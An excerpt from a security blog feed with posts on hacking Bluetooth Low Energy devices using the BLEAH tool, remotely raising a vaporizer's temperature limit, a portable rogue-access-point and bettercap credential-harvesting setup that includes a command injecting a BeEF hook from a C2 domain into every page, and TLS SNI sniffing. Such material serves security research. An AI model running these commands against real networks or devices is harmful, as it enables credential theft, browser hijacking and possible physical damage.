    <content type="html"><![CDATA[<p>This is not a post about BLE, but rather on how to hack it … well, to be honest, BLE devices are usually very easy to hack, so it’s just a quick intro to it, I’ll also take the chance to open source one of the last tools I’ve made and that I kept private so far. I moved the features I thought to be dangerous ( aka: auto fuzzing all the BLE things and bring chaos ) in a private fork which will stay private, however it’s not that complicated to chain <code>bleah</code> with other tools ( cough … radamsa … cough ) and have <strong>lots of fun</strong>.</p>
<p><img src="/images/2017/09/dr_evil.jpg" alt="dr.evil"></p>
<p>Oh and this is also because <a href="https://twitter.com/Viss" target="_blank" rel="noopener">someone</a> asked me some intro on BLE, so yeah, his fault.</p>
<a id="more"></a>
<p>For some more detailed (and serious) information, there’s <a href="https://en.wikipedia.org/wiki/Bluetooth_Low_Energy" target="_blank" rel="noopener">a lot of stuff</a> online already, you know how to Google.</p>
<h3 id="Bluetooth-Low-Energy-the-honest-version"><a href="#Bluetooth-Low-Energy-the-honest-version" class="headerlink" title="Bluetooth Low Energy - the honest version."></a>Bluetooth Low Energy - the honest version.</h3><p>BLE is a cheap and very insecure version of Bluetooth, in which you have no channel hopping (all hail easy sniffing and MITM!) and no builtin protocol security (fuzzing like there’s no tomorrow dudez!), it is mostly used for two reasons:</p>
<ul>
<li>Decent batteries are expensive.</li>
<li>Decent batteries are big.</li>
</ul>
<p>If you wanna build and sell some IoT-smart-whatever crap, and you wanna do it quickly because your competitor is about to go on the market with the same shit, you take Bluetooth, you strip it from the very few close-to-decent things it has and voilà, you have its retarded little brother which won’t bother the battery too much but will be functional enough to burp random data at you from time to time … easy win, litte R&amp;D efforts, very small production costs.</p>
<p>&lt;/rant&gt;</p>
<p>Being the retarded little brother of BT, it doesn’t really take too long to explain how to hack it.</p>
<p>Imagine you have a BT device, which 99% of the times it’s discoverable, on the same frequency and channel, always, that literally burps at you its information ( what it’s called <strong>advertisement data</strong>, <a href="/2015/01/29/nike-fuelband-se-ble-protocol-reversed/">sometimes they also broadcast security tokens</a>, etc … to anyone … ), you connect to it (because 99.999999% of the times it allows anyone to connect) and the device tells you <strong>everything</strong> you need to know in order to control it, read data from it and write data to it … how kind, isn’t it? :D</p>
<p>You are provided with read and write primitives / channels ( called <code>characteristics</code> ), each one with a specific identifier, some of them <a href="https://www.bluetooth.com/specifications/gatt/services" target="_blank" rel="noopener">are standard</a> and some of them are usually vendor specific, therefore you won’t be able to easily map something like <code>d0611e78-bbb4-4591-a5f8-487910ae4366</code> to something like <code>Apple Continuity Service</code> (more on how to solve this problem later).</p>
<p>Rather than this, all the implementation details ( aka: the communication protocol ) are up to the vendor … you see now?</p>
<p><img src="/images/2017/09/chaos.jpg" alt="pure chaos"></p>
<h3 id="Methodologies-and-required-hardware"><a href="#Methodologies-and-required-hardware" class="headerlink" title="Methodologies and required hardware (?)"></a>Methodologies and required hardware (?)</h3><p>As I was saying yesterday night to Viss, you can approach BLE hacking in two ways.</p>
<p>You can go passive, therefore you’ll need a <a href="https://github.com/greatscottgadgets/ubertooth" target="_blank" rel="noopener">Ubertooth One</a> to sniff raw BLE packets out of the air and Wireshark to visualize them. In this case you’ll end up performing signal analysis / RE on the raw bitstream you’ve managed to capture, simply try some replay attack or blackbox fuzzing ( aka: throw mutated stuff back at the mother fucker ). As for this first methodology, <a href="http://blog.attify.com/2017/01/17/exploiting-iot-enabled-ble-smart-bulb-security/" target="_blank" rel="noopener">there’re already</a> plenty of good examples online, it’s just like sniffing TCP, but with BLE.</p>
<p>Or you can go active (the way I like it :D), and that doesn’t require any specific hardware other than a bluetooth dongle which supports BLE, most likely your Linux laptop already does, and exploit those little bastards for what they are, just <strong>retarded bluetooth devices</strong>. Find the mobile app (they always have one, they’re <strong>smart</strong> toys after all), reverse it to find the right characteristics to use for your goal and then just blow the thing up. My point is that you’ll end up reversing “something” anyway, so let it be cheap and effective, right?</p>
<p>Let’s start by verifying if your hardware supports BLE by performing a scan ( I’m assuming you are using GNU/Linux, bluez and all the default BT stack utilities are installed, etc ):</p>
<pre><code>sudo hcitool lescan
</code></pre><p>If it worked, you’ll see an output like:</p>
<pre><code>LE Scan ...
AA:BB:CC:DD:EE:FF (unknown)
AA:BB:CC:DD:EE:FF STORZ&amp;BICKEL
AA:BB:CC:DD:EE:FF (unknown)
AA:BB:CC:DD:EE:FF (unknown)
AA:BB:CC:DD:EE:FF (unknown)
AA:BB:CC:DD:EE:FF (unknown)
AA:BB:CC:DD:EE:FF (unknown)
AA:BB:CC:DD:EE:FF (unknown)
AA:BB:CC:DD:EE:FF (unknown)
AA:BB:CC:DD:EE:FF [LG] webOS TV OLED55E6V
</code></pre><p>That means you’re ready to go. Go find the Android application of the device and reverse it, <a href="/2017/04/27/Android-Applications-Reversing-101/">here’s my 1 on 1 on Android reversing</a> and <a href="/tags/bluetooth/">here</a> you will find a few examples of how to use this approach.</p>
<p>I could now explain you how to read advertisement data using <code>hcitool</code>, how to connect to it using <code>gatttool</code> and how to enumerate services, characteristics and handles, how to mask flags and translate their bits to permissions, etc … but I made it a little bit easier for you (and for me), so let’s skip this boring stuff ok? :P</p>
<h3 id="Introducing-BLEAH"><a href="#Introducing-BLEAH" class="headerlink" title="Introducing BLEAH"></a>Introducing BLEAH</h3><p><a href="https://github.com/evilsocket/bleah" target="_blank" rel="noopener">BLEAH</a> is a <strong>dead easy to use tool</strong>, because retarded devices should be <strong>dead easy to hack</strong>, based on <a href="https://github.com/IanHarvey" target="_blank" rel="noopener">Iah Harvey</a>‘s <code>bluepy</code> python package.</p>
<p>But let me give you some examples and swag.</p>
<p>Scanning for BTLE devices continuously:</p>
<pre><code>sudo bleah -t0
</code></pre><p><img src="/images/2017/09/ss1.png" alt="scan"></p>
<p>Connect to a specific device and enumerate all the things:</p>
<pre><code>sudo bleah -b &quot;aa:bb:cc:dd:ee:ff&quot; -e
</code></pre><p><img src="/images/2017/09/ss2.png" alt="enum"></p>
<p>Write the bytes <code>hello world</code> to a specific characteristic of the device:</p>
<pre><code>sudo bleah -b &quot;aa:bb:cc:dd:ee:ff&quot; -u &quot;c7d25540-31dd-11e2-81c1-0800200c9a66&quot; -d &quot;hello world&quot;
</code></pre><p><img src="/images/2017/09/ss3.png" alt="write"></p>
<p>Hint: there’s a <code>--data-file</code> argument which is perfect in combination with things like <code>radamsa</code> … just saying.</p>
<p>As usual the public fork of this tool is on <a href="https://github.com/evilsocket/bleah" target="_blank" rel="noopener">github</a>, now you know and have everything you need to bring chaos in the BLE world, enjoy :D</p>
<div style="position:relative;height:0;padding-bottom:75.0%"><iframe src="https://www.youtube.com/embed/qbmWs6Jf5dc?ecver=2" width="480" height="360" frameborder="0" style="position:absolute;width:100%;height:100%;left:0" allowfullscreen></iframe></div>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;This is not a post about BLE, but rather on how to hack it … well, to be honest, BLE devices are usually very easy to hack, so it’s just a quick intro to it, I’ll also take the chance to open source one of the last tools I’ve made and that I kept private so far. I moved the features I thought to be dangerous ( aka: auto fuzzing all the BLE things and bring chaos ) in a private fork which will stay private, however it’s not that complicated to chain &lt;code&gt;bleah&lt;/code&gt; with other tools ( cough … radamsa … cough ) and have &lt;strong&gt;lots of fun&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/2017/09/dr_evil.jpg&quot; alt=&quot;dr.evil&quot;&gt;&lt;/p&gt;
&lt;p&gt;Oh and this is also because &lt;a href=&quot;https://twitter.com/Viss&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;someone&lt;/a&gt; asked me some intro on BLE, so yeah, his fault.&lt;/p&gt;
    
    </summary>
    
    
      <category term="ble" scheme="https://www.evilsocket.net/tags/ble/"/>
    
      <category term="bluetooth low energy" scheme="https://www.evilsocket.net/tags/bluetooth-low-energy/"/>
    
      <category term="bluetooth" scheme="https://www.evilsocket.net/tags/bluetooth/"/>
    
      <category term="btle" scheme="https://www.evilsocket.net/tags/btle/"/>
    
      <category term="bleah" scheme="https://www.evilsocket.net/tags/bleah/"/>
    
  </entry>
  
  <entry>
    <title>Hacking a Herb Vaporizer to Set Its Temperature Limit From 190C to 6553.5C Remotely</title>
    <link href="https://www.evilsocket.net/2017/08/25/Mini-Post-Hacking-a-Herb-Vaporizer-using-GNU-Linux-and-BLE-raw-commands/"/>
    <id>https://www.evilsocket.net/2017/08/25/Mini-Post-Hacking-a-Herb-Vaporizer-using-GNU-Linux-and-BLE-raw-commands/</id>
    <published>2017-08-25T01:10:53.000Z</published>
    <updated>2019-10-19T08:14:27.109Z</updated>
    
    <content type="html"><![CDATA[<p>Tonight my brain decided, instead of sleeping (why even bother trying, right?), to start a <a href="/2015/01/29/nike-fuelband-se-ble-protocol-reversed/">new</a> short adventure in the <strong>Bluetooth Low Energy</strong> world. I’m a happy <a href="https://www.storz-bickel.com/eu/en/crafty.html" target="_blank" rel="noopener">Crafty</a> vaporizer owner and as I discovered by chance, I can access it using my laptop.</p>
<p><img src="/images/2017/08/ble_1.png" alt="ble_1"></p>
<a id="more"></a>
<p>BTLE is conceptually easy, you’ve got “descriptors”, each one with an unique identifier and each one is arbitrarily used by the vendor for configuration purposes, control of the device, etc by read or write operations. So, first thing first, let’s reverse <a href="https://play.google.com/store/apps/details?id=com.storz_bickel.app.m_vap" target="_blank" rel="noopener">their mobile application</a> in order to identify interesting descriptors!</p>
<p><img src="/images/2017/08/ble_2.png" alt="ble_2"></p>
<p>Here it is, we can read and write stuff with <strong>no authentication whatsoever</strong> … so, let’s get evil, shall we? :) </p>
<p>How about writing to:</p>
<pre><code>public static final UUID characteristicTargetTemperatureUUID = UUID.fromString(&quot;00000021-4C45-4B43-4942-265A524F5453&quot;);
</code></pre><p>The target temperature ( 190 C in my case ) is multiplied by 10 (<del>don’t ask</del> as someone <a href="https://www.reddit.com/r/netsec/comments/6vvroj/hacking_a_herb_vaporizer_to_set_its_temperature/dm4e4gj/" target="_blank" rel="noopener">vigorously pointed out</a>, that’s <em>“pretty common when you don’t have/want floating-point arithmetic, or you want to represent exact values for a certain precision”</em> … it doesn’t really matter for the scope of this blog post, but now we’re all happy) and stored as two bytes, <strong>so let’s try to overwrite it with the maximum!</strong> <em>-put evil laugh here-</em></p>
<p><img src="/images/2017/08/ble_temp.png" alt="ble_temp"></p>
<p>Which should be a limit of 6553.5 Celsius degrees.</p>
<p><img src="/images/2017/08/pew.jpg" alt="pew pew"></p>
<p><strong>BOOM BABY!!!</strong> <strong>I have no idea what happens if I turn it on now</strong> … it’s the only Crafty I have, and it’s not cheap, I’m not going to try, but the options are:</p>
<ol>
<li>Hopefully some firmware security measure blocks the device from melting.</li>
<li>Device melts in your hands.</li>
<li>Battery just dies before it melts. </li>
</ol>
<p>How likely is <strong>1</strong> given there’s no security at all at the BTLE layer? Maybe some hardware security device? If anyone has a spare Crafty to try, let me know …</p>
<h3 id="Disclosure"><a href="#Disclosure" class="headerlink" title="Disclosure"></a>Disclosure</h3><p>I can hear people screaming <strong>and what about responsible disclosure ?!</strong> … I don’t know why people give responsible disclosure for granted to be honest … I do this stuff for fun, if I need to start searching for contacts and wait for replies it becomes a job and it’s not fun anymore … ¯\_(ツ)_/¯</p>
<h3 id="Bonus-Level"><a href="#Bonus-Level" class="headerlink" title="Bonus Level"></a>Bonus Level</h3><p>On the info screen of the app, if you tap 5 times on the serial number and put the correct password, it’ll unlock some nice diagnostic menu … this is <code>SHA256(password)</code> :)</p>
<p><img src="/images/2017/08/ble_3.png" alt="ble_3"></p>
<p>Diagnostic menu options (<strong>also controllable via BTLE</strong>):</p>
<p><img src="/images/2017/08/ble_diag.png" alt="ble_3"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Tonight my brain decided, instead of sleeping (why even bother trying, right?), to start a &lt;a href=&quot;/2015/01/29/nike-fuelband-se-ble-protocol-reversed/&quot;&gt;new&lt;/a&gt; short adventure in the &lt;strong&gt;Bluetooth Low Energy&lt;/strong&gt; world. I’m a happy &lt;a href=&quot;https://www.storz-bickel.com/eu/en/crafty.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Crafty&lt;/a&gt; vaporizer owner and as I discovered by chance, I can access it using my laptop.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/2017/08/ble_1.png&quot; alt=&quot;ble_1&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="ble" scheme="https://www.evilsocket.net/tags/ble/"/>
    
      <category term="hacking" scheme="https://www.evilsocket.net/tags/hacking/"/>
    
      <category term="linux" scheme="https://www.evilsocket.net/tags/linux/"/>
    
      <category term="bluetooth low energy" scheme="https://www.evilsocket.net/tags/bluetooth-low-energy/"/>
    
      <category term="bluetooth" scheme="https://www.evilsocket.net/tags/bluetooth/"/>
    
      <category term="btle" scheme="https://www.evilsocket.net/tags/btle/"/>
    
      <category term="low energy" scheme="https://www.evilsocket.net/tags/low-energy/"/>
    
      <category term="terminal" scheme="https://www.evilsocket.net/tags/terminal/"/>
    
      <category term="crafty vaporizer" scheme="https://www.evilsocket.net/tags/crafty-vaporizer/"/>
    
      <category term="crafty" scheme="https://www.evilsocket.net/tags/crafty/"/>
    
      <category term="vaporizer" scheme="https://www.evilsocket.net/tags/vaporizer/"/>
    
  </entry>
  
  <entry>
    <title>GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup</title>
    <link href="https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/"/>
    <id>https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/</id>
    <published>2017-08-15T15:13:21.000Z</published>
    <updated>2019-10-19T08:14:27.114Z</updated>
    
    <content type="html"><![CDATA[<p>It’s no secret I’ve been recently playing with the <a href="https://www.indiegogo.com/projects/gpd-pocket-7-0-umpc-laptop-ubuntu-or-win-10-os-laptop--2" target="_blank" rel="noopener">GPD Pocket 7</a>, an ultra small laptop which can run GNU/Linux and has more than decent hardware. Tablets are cool and everything, but I’ve been a fan of ultra portable Linux devices since the <a href="https://www.google.com/search?&amp;source=lnms&amp;tbm=isch&amp;q=open+zaurus+sl-c1000" target="_blank" rel="noopener">Sharp Zaurus</a> series. Considering that a <a href="https://twitter.com/evilsocket/status/896847606072127488" target="_blank" rel="noopener">lot of people were interested</a> I decided to write this post to share my impressions, installation procedure and configuration tips.</p>
<p><img src="https://pbs.twimg.com/media/DG4TXarXcAAsxSa.jpg" alt="gpd"></p>
<a id="more"></a>
<h3 id="Specs"><a href="#Specs" class="headerlink" title="Specs"></a>Specs</h3><p>Let’s start with the hardware specs of this sweet little thing:</p>
<ul>
<li>7-inch full-HD (1920×1200) IPS touch display</li>
<li>Intel Atom x7-Z8750 CPU (Quad Core) @ 1.6GHz</li>
<li>8GB RAM</li>
<li>128GB eMMC</li>
<li>7,000 mAh battery (12 hours battery life estimated)</li>
<li>802.11ac WiFi</li>
<li>Bluetooth 4.1</li>
<li>1x USB 3.0 Type-C</li>
<li>1x USB 3.0 Type-A</li>
<li>micro HDMI</li>
<li>3.5mm headphone jack</li>
</ul>
<p><strong>Not bad at all!</strong> right?</p>
<h3 id="Installing-GNU-Linux"><a href="#Installing-GNU-Linux" class="headerlink" title="Installing GNU/Linux"></a>Installing GNU/Linux</h3><p>Despite they should start shipping the Ubuntu 16.04 models in a few days (?), I decided to buy the Windows version, which means I had to install GNU/Linux from scratch and overcome/fix several hardware issues … since I’m a good guy, let me share with you the correct procedure :D</p>
<ol>
<li>Download your GNU/Linux distribution ISO ( in my case, it was Ubuntu 17.04 ).</li>
<li>Clone <a href="https://github.com/cawilliamson/ansible-gpdpocket" target="_blank" rel="noopener">this repository</a> and run the <code>bootstrap-iso.sh</code> script against the ISO file.</li>
<li>Write the resulting <code>~/bootstrap.iso</code> file to an USB drive using UNetBootin or whatever you like.</li>
<li>Plug the USB drive to your GPD, turn it on and press the <code>DEL</code> button to enter BIOS and boot from it.</li>
</ol>
<p>This will start the usual GNU/Linux installation procedure.</p>
<p><strong>NOTE:</strong> Data on USB Type-C still does not work, but efforts are being made about it, we only need to wait.</p>
<h3 id="Updating-custom-Kernel-and-stuff"><a href="#Updating-custom-Kernel-and-stuff" class="headerlink" title="Updating custom Kernel and stuff."></a>Updating custom Kernel and stuff.</h3><p>After installation and the routine system update, you might want to periodically update the fixes and custom kernel from the repository, in order to do so you should run the <code>gpd-update</code> script as root, this will take 2-3 hours since the kernel is going to be compiled on the device itself.</p>
<p>If you are running Ubuntu 17.04 as me and are experiencing <a href="https://github.com/cawilliamson/ansible-gpdpocket/issues/49" target="_blank" rel="noopener">this issue</a>, you might want to do the following instead:</p>
<p><strong>Make sure apt is not locked and you have internet connectivity first.</strong></p>
<pre><code>sudo rm -rf /usr/src/ansible-gpdpocket
sudo git clone https://github.com/cawilliamson/ansible-gpdpocket.git /usr/src/ansible-gpdpocket
cd /usr/src/ansible-gpdpocket
sudo git reset --hard origin/master
</code></pre><p>Before you continue, edit the <code>roles/boot/tasks/debian.yml</code> file and <strong>remove this block</strong> from it:</p>
<pre><code>- name: install intel-microcode (iso creation = no)
  apt: name=intel-microcode
  when: chroot == false
  tags:
  - boot
</code></pre><p>( Don’t worry, you already have Intel microcode installed )</p>
<p>And eventually start the update process itself:</p>
<pre><code>sudo ANSIBLE_NOCOWS=1 ansible-playbook system.yml
</code></pre><p>After the update is over, reboot and you’re ready to go :)</p>
<h3 id="Getting-Offensive"><a href="#Getting-Offensive" class="headerlink" title="Getting Offensive"></a>Getting Offensive</h3><p>At this point, you have a quad core Intel cpu, GNU/Linux and an USB 3.0 port, I mean, imagination is the limit! </p>
<p>Personally, I like to have an Anker Astro E7 powerbank connected to the USB Type-C and the hardware I need to the USB 3.0 port (maybe with some <a href="https://www.amazon.it/gp/product/B0192W3HX8/ref=oh_aui_detailpage_o00_s00?ie=UTF8&amp;psc=1" target="_blank" rel="noopener">USB 3 hub</a>, to have appropriate bandwidth, powered by the same powerbank), then I can attach pretty much whatever I want to it, including an Alfa antenna, an Ubertooth One (great also to have a 2.4Ghz portable spectrum analyzer!) or some SDR card (most of SDR applications will require the full bandwidth of the USB port, which means it’s unlikely you’ll be able to use something else at the same time).</p>
<p>Here’s a very ugly PoC of what I mean, I’m still waiting for a decent USB hub to be delivered by Amazon:</p>
<p><img src="https://pbs.twimg.com/media/DHI-InZXgAEmggO.jpg" alt="stuff"></p>
<p>In its simplest form, my portable offensive configuration is:</p>
<ul>
<li>GPD powered by the aforementioned powerbank.</li>
<li>Main WiFi card connected to my smartphone (which is tethering via WiFi AP) as upstream.</li>
<li>Alfa AWUS036NHR 2000mW with a HUACAM HCM82 8dBi dualband antenna for rogue AP and packet injection.</li>
<li>Sensepost MANA running in <code>simple-nat</code> mode.</li>
<li>BetterCap for credentials harvesting, pcap capture and reporting.</li>
</ul>
<pre><code>sudo bettercap --no-spoofing --no-discovery -I YOUR_ALFA_INTERFACE -X
</code></pre><p>Or, if you feel really evil, you can also have the HTTP proxy inject your BEEF hook to every page:</p>
<pre><code>sudo bettercap ...same as before... --proxy-module injectjs --js-url http://your-beef-c2-domain/hook.js
</code></pre><p>If you’ll make bettercap save everything to a pcap file, this file will contains the traffic of all the targets and it will potentially become very big, I suggest you to use the USB hub and attach an external drive as well. Then just make bettercap write to it with appropriate command line arguments for offline inspection and credentials harvesting.</p>
<pre><code>sudo bettercap ...same... --sniffer-output /media/your/usbdrive/capture.pcap
</code></pre><p>… GOODBYE WIFI PINEAPPLE! :D</p>
<h3 id="Impressions-amp-Links"><a href="#Impressions-amp-Links" class="headerlink" title="Impressions &amp; Links"></a>Impressions &amp; Links</h3><p>TL;DR: This device is <strong>awesome</strong>, expensive, but still, <strong>awesome</strong>.</p>
<h5 id="Keyboard"><a href="#Keyboard" class="headerlink" title="Keyboard"></a>Keyboard</h5><p>Yes the layout is a very weird displaced QWERTY and yes the keys are small … you’ll get used to it unless you have very big hands.</p>
<h5 id="Battery-Life"><a href="#Battery-Life" class="headerlink" title="Battery Life"></a>Battery Life</h5><p>I didn’t try the battery life as I always use the powerbank (the USB devices are draining power, that would kill the internal 7000mAh battery), but people said they achieved <strong>3 hours of intense gaming</strong> on Windows, normal use on GNU/Linux should last quite long.</p>
<h5 id="Display"><a href="#Display" class="headerlink" title="Display"></a>Display</h5><p>Great definition and the <strong>touchscreen</strong> helps a lot navigating the menu … actually this is the very first time I find a touch screen to be really useful on Linux :D</p>
<h5 id="Mouse"><a href="#Mouse" class="headerlink" title="Mouse"></a>Mouse</h5><p>Yeah the “mouse” is crap, but usable … as I said, touchscreen FTW!</p>
<h5 id="Price"><a href="#Price" class="headerlink" title="Price"></a>Price</h5><p>Expensive, from 500 to 600 USD … it’s a little nice toy but you’ll have to pay for it.</p>
<h5 id="Speed-Usability"><a href="#Speed-Usability" class="headerlink" title="Speed / Usability"></a>Speed / Usability</h5><p>Despite being an Atom, the CPU works great, as long as you don’t spawn 1000000000 apps you’ll do just fine … I mean, if <a href="https://www.evilsocket.net/2016/03/31/how-to-build-your-own-rogue-gsm-bts-for-fun-and-profit/">you can run a rogue GSM BTS on a RPi</a>, this hardware is actually <strong>more than just fine</strong>.</p>
<h5 id="Connectivity"><a href="#Connectivity" class="headerlink" title="Connectivity"></a>Connectivity</h5><p>Internal WiFi is super stable and has decent coverage, Bluetooth also works great.</p>
<h5 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h5><p>Check …</p>
<ul>
<li>… <a href="https://reddit.com/r/GPDPocket/" target="_blank" rel="noopener">this</a> out to stay updated on mods and hacks …</li>
<li>… <a href="https://github.com/cawilliamson/ansible-gpdpocket" target="_blank" rel="noopener">this</a> for custom kernel and fixes …</li>
<li>… <a href="https://github.com/jwrdegoede/linux-sunxi" target="_blank" rel="noopener">this</a> for custom kernel developement …</li>
<li>and <a href="https://indiegogo.com/projects/gpd-pocket-7-0-umpc-laptop-ubuntu-or-win-10-os-laptop--2" target="_blank" rel="noopener">this</a> for official updates.</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;It’s no secret I’ve been recently playing with the &lt;a href=&quot;https://www.indiegogo.com/projects/gpd-pocket-7-0-umpc-laptop-ubuntu-or-win-10-os-laptop--2&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;GPD Pocket 7&lt;/a&gt;, an ultra small laptop which can run GNU/Linux and has more than decent hardware. Tablets are cool and everything, but I’ve been a fan of ultra portable Linux devices since the &lt;a href=&quot;https://www.google.com/search?&amp;amp;source=lnms&amp;amp;tbm=isch&amp;amp;q=open+zaurus+sl-c1000&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Sharp Zaurus&lt;/a&gt; series. Considering that a &lt;a href=&quot;https://twitter.com/evilsocket/status/896847606072127488&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;lot of people were interested&lt;/a&gt; I decided to write this post to share my impressions, installation procedure and configuration tips.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://pbs.twimg.com/media/DG4TXarXcAAsxSa.jpg&quot; alt=&quot;gpd&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="bettercap" scheme="https://www.evilsocket.net/tags/bettercap/"/>
    
      <category term="mitm" scheme="https://www.evilsocket.net/tags/mitm/"/>
    
      <category term="linux" scheme="https://www.evilsocket.net/tags/linux/"/>
    
      <category term="wifi pentesting" scheme="https://www.evilsocket.net/tags/wifi-pentesting/"/>
    
      <category term="gpd pocket 7" scheme="https://www.evilsocket.net/tags/gpd-pocket-7/"/>
    
      <category term="gpd" scheme="https://www.evilsocket.net/tags/gpd/"/>
    
      <category term="wireless" scheme="https://www.evilsocket.net/tags/wireless/"/>
    
      <category term="sigint" scheme="https://www.evilsocket.net/tags/sigint/"/>
    
      <category term="sdr" scheme="https://www.evilsocket.net/tags/sdr/"/>
    
      <category term="rogue ap" scheme="https://www.evilsocket.net/tags/rogue-ap/"/>
    
      <category term="mana" scheme="https://www.evilsocket.net/tags/mana/"/>
    
      <category term="pentest" scheme="https://www.evilsocket.net/tags/pentest/"/>
    
      <category term="red teaming" scheme="https://www.evilsocket.net/tags/red-teaming/"/>
    
      <category term="hardware" scheme="https://www.evilsocket.net/tags/hardware/"/>
    
      <category term="equipment" scheme="https://www.evilsocket.net/tags/equipment/"/>
    
  </entry>
  
  <entry>
    <title>TLS, Server Name Indication and Why We Need to Encrypt It</title>
    <link href="https://www.evilsocket.net/2017/06/30/BetterCap-1-6-1-TLS-Server-Name-Indication-and-Why-We-Need-to-Encrypt-It/"/>
    <id>https://www.evilsocket.net/2017/06/30/BetterCap-1-6-1-TLS-Server-Name-Indication-and-Why-We-Need-to-Encrypt-It/</id>
    <published>2017-06-30T10:28:18.000Z</published>
    <updated>2019-10-19T08:14:27.105Z</updated>
    
    <content type="html"><![CDATA[<p>Yesterday I released version 1.6.1 of <a href="https://bettercap.org" target="_blank" rel="noopener">bettercap</a> and among other things, you can read in the changelog:</p>
<pre><code>* Huge improvement on HTTPS parser, now it parses TLS Client Hello messages with SNI extension in order to extract the real hostname.
...
</code></pre><p>But what does this actually mean? And how can we protect ourselves from it? (Hint: <strong>we can’t, yet</strong>)</p>
<p><img src="/images/2017/07/sni.png" alt="sni"></p>
<a id="more"></a>
<h1 id="Server-Name-Indication"><a href="#Server-Name-Indication" class="headerlink" title="Server Name Indication"></a>Server Name Indication</h1><p>Let’s take a simple HTTP request to explain the concept, this is a GET request to the index of somesite.com:</p>
<pre><code>GET / HTTP/1.1
Host: somesite.com
Connection: close
</code></pre><p>As we all know, once it gets this request the server is able to “understand” what virtual host it’s supposed to serve by reading the <code>Host</code> header, but what happens when the request is HTTPS and therefore the server can not read the Host header before providing the certificate?<br>What if server X is hosting multiple domains behind HTTPS? What’s the certificate it should send to the client? Here it comes <strong>Server Name Indication</strong> ( <a href="https://en.wikipedia.org/wiki/Server_Name_Indication" target="_blank" rel="noopener">SNI</a> ) for the rescue!</p>
<p>SNI is a mechanism which has been introduced in TLS as an extension to solve this problem, long story short, during the TLS handshake the client will send the name of the host it wants to connect to ( pretty much like the Host header on HTTP ), this piece of information is going to be transmitted <strong>unencrypted</strong> ( it has to! ), therefore we can intercept it.</p>
<p>As you can see in the image, by parsing such handshakes, bettercap is now able to tell you <strong>exactly</strong> what websites the target is browsing even if they’re on HTTPS, while the version before only “assumed” which was the domain by resolving it from the IP (and most of the times, failing miserably to give any useful result).</p>
<h1 id="How"><a href="#How" class="headerlink" title="How"></a>How</h1><p>Very simple, with just a <a href="https://github.com/evilsocket/bettercap/blob/master/lib/bettercap/sniffer/parsers/https.rb" target="_blank" rel="noopener">few lines</a> of (bad) code of course!</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"># poor man&apos;s TLS Client Hello with SNI extension parser :P</span><br><span class="line">if pkt.respond_to?(:tcp_dst) and \</span><br><span class="line"> pkt.payload[0] == &quot;\x16&quot; and \</span><br><span class="line"> pkt.payload[1] == &quot;\x03&quot; and \</span><br><span class="line"> pkt.payload =~ /\x00\x00.&#123;4&#125;\x00.&#123;2&#125;([a-z0-9]+([\-\.]&#123;1&#125;[a-z0-9]+)*\.[a-z]&#123;2,6&#125;)\x00/</span><br><span class="line">hostname = $1</span><br><span class="line">if pkt.tcp_dst != 443</span><br><span class="line">  hostname += &quot;:#&#123;pkt.tcp_dst&#125;&quot;</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h1 id="What-can-we-do-about-it"><a href="#What-can-we-do-about-it" class="headerlink" title="What can we do about it?"></a>What can we do about it?</h1><p><img src="/images/2017/07/encrypt.png" alt="encrypt all the things"></p>
<p>Seriously, there’s not much we can do about it right now, which means <strong>even if you’re using HTTPS only, the domains you’re browsing are leaked on the network anyway … adios privacy!</strong> The only logical thing would be to <a href="https://www.ietf.org/proceedings/94/slides/slides-94-tls-8.pdf" target="_blank" rel="noopener">encrypt the SNI payload</a> as suggested in this document ( tnx to <a href="https://twitter.com/fpietrosanti" target="_blank" rel="noopener">Fabio</a> for the link! ), but I guess we’ll have to wait some time :)</p>
<h1 id="One-more-thing"><a href="#One-more-thing" class="headerlink" title="One more thing"></a>One more thing</h1><p><strong>USE A VPN, ESPECIALLY ON PUBLIC NETWORKS FOR F°°°’S SAKE!!!</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Yesterday I released version 1.6.1 of &lt;a href=&quot;https://bettercap.org&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;bettercap&lt;/a&gt; and among other things, you can read in the changelog:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;* Huge improvement on HTTPS parser, now it parses TLS Client Hello messages with SNI extension in order to extract the real hostname.
...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But what does this actually mean? And how can we protect ourselves from it? (Hint: &lt;strong&gt;we can’t, yet&lt;/strong&gt;)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/2017/07/sni.png&quot; alt=&quot;sni&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="bettercap" scheme="https://www.evilsocket.net/tags/bettercap/"/>
    
      <category term="mitm" scheme="https://www.evilsocket.net/tags/mitm/"/>
    
      <category term="tls" scheme="https://www.evilsocket.net/tags/tls/"/>
    
      <category term="sni" scheme="https://www.evilsocket.net/tags/sni/"/>
    
